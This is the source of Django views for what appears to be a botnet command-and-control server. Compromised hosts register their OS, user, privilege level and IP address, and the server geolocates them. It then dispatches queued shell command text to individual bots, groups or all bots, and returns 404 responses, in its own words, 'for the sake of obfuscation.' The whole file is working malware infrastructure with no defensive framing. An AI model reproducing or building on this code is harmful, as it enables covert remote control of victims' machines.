import random
import json
from urllib.request import urlopen

from django.shortcuts import render, get_object_or_404
from django.http import HttpResponse, HttpResponseRedirect, Http404
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone

from .models import Bot, Command, Bot_Command

# Determine a new bot's group based on OS and privilege
def get_group(operating_sys, user):
    with open('groups.json', 'r') as infile:
        groups = json.loads(infile.read())
    users = groups[operating_sys.lower()]
    try:
        group_num = users[user]
        if 'windows' in operating_sys and '(admin)' in user:
            group_num = users['admin']
    except KeyError:
        group_num = users['standard']

    return group_num


# Grab a Command object based on a hash_sum or group number
# If no command exists for the query, return None
def get_cmd(bot, query_set, hash_sum=None, group=None):
    cmd_list = None
    if hash_sum:
        cmd_list = query_set.filter(hash_assigned=hash_sum)
    elif group:
        cmd_list = query_set.filter(group_assigned=group)

    if not cmd_list:
        return None

    for cmd in cmd_list:
        if cmd.oneshot and cmd in bot.completed_cmds.all():
            continue
        else:
            return cmd

    return None


# Views begin here

def index(request):
    return HttpResponse('')


@csrf_exempt
def register(request):
    try:
        hash_type = request.POST['hash_type']
        hash_sum = request.POST['hash_sum']
        operating_sys = request.POST['operating_sys']
        ip_addr = request.POST['ip_addr']
        user = request.POST['user']
        group = get_group(operating_sys, user)
        last_contact = timezone.now()

        geo_html = urlopen('https://ipinfo.io/{}/geo'.format(ip_addr)).read().decode('utf-8')
        geo_json = json.loads(geo_html)
        geolocation = geo_json['country']

        bot = Bot.objects.create(
            hash_type=hash_type,
            hash_sum=hash_sum,
            group=group,
            operating_sys=operating_sys,
            user=user,
            ip_addr=ip_addr,
            geolocation=geolocation,
            last_contact=last_contact,
        )

        return HttpResponse('')
    except:
        # An error in registration likely means tampering or something went wrong
        # Return a 404 for the sake of obfuscation
        raise Http404()


@csrf_exempt
def cmd(request):
    hash_sum = request.POST['hash_sum']
    ip_addr = request.POST['ip_addr']

    bot = get_object_or_404(Bot, hash_sum=hash_sum)
    bot.ip_addr = ip_addr
    bot.last_contact = timezone.now()
    bot.save()

    # Only use commands that are queued to run at this time
    now = timezone.now()
    active_cmds = Command.objects.filter(
        start_time__lte=now,
        end_time__gte=now
    ).order_by('start_time')

    if not active_cmds:
        raise Http404

    # Prioritize individual commands, ALL commands, group commands, and lastly
    # default commands
    # If no commands are in the bot's queue, return a 404

    command = False
    while True: # Run within loop to allow for better flow control
        command = get_cmd(bot, active_cmds, hash_sum=hash_sum)
        if command:
            break
        command = get_cmd(bot, active_cmds, group=-1)
        if command:
            break
        command = get_cmd(bot, active_cmds, group=bot.group)
        if command:
            break
        command = get_cmd(bot, active_cmds, group=-2)
        break

    # If command selected then continue
    if command:
        # Then check if bot already ran command
        # If not, then add command to bot's list of completed commands
        Bot_Command.objects.get_or_create(
            bot=bot,
            cmd=command,
        )

        # Lastly return the command text (or 404)
        return HttpResponse(command.cmd_txt)
    raise Http404
